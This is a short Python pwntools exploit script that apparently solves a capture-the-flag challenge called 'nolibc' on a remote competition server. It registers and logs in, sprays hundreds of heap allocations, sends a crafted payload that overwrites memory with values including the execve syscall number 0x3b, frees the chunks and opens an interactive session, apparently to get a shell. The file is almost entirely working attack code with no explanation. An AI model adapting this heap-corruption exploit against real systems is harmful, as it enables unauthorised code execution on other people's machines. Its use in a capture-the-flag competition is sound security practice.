from pwn import *
from multiprocessing import Pool
import random
import time
import os

#context.log_level = "debug"

random.seed(time.time())

#p = process("./main")

p = remote("nolibc.chals.sekai.team", 1337, ssl=True)

# login
name = "mntly"
pw = "mntly"
p.sendlineafter(b"Choose an option: ", "2")
p.sendlineafter(b"Username: ", name)
p.sendlineafter(b"Password: ", pw)

p.sendlineafter(b"Choose an option: ", "1")
p.sendlineafter(b"Username: ", name)
p.sendlineafter(b"Password: ", pw)

def allocN(p, N):
    p.sendlineafter(b"Choose an option: ", "1")
    p.sendlineafter(b"Enter string length: ", str(N))
    p.sendlineafter(b"Enter a string: ", "deadmntly")
    time.sleep(0.005)

def freeN(p, N):
    p.sendlineafter(b"Choose an option: ", "2")
    p.sendlineafter(b"Enter the index of the string to delete: ", str(N))

def RepeatAllocMN(p, M, N):
    for i in range(M):
        allocN(p, N)

def RepeatFreeMN(p, M, N):
    for i in range(M):
        freeN(p, N)

RepeatAllocMN(p, 683, 16) # 0 ~ 682
RepeatAllocMN(p, 59, 255) # 683 ~ 683 + 58 : 0 ~ 741
RepeatAllocMN(p, 3, 16)   # 741 ~ 741 + 2  : 0 ~ 743

#pause()

p.sendlineafter(b"Choose an option: ", "1")
p.sendlineafter(b"Enter string length: ", str(0x2f))
#p.sendlineafter(b"Enter a string: ", b"A" * 0x20 + b'\x59' * 0x10)

p.sendlineafter(b"Enter a string: ", b"A" * 0x20 + p32(0) + p32(1) + p32(0x3b) + p32(3))

RepeatFreeMN(p, 744, 0)

#pause()

p.interactive()
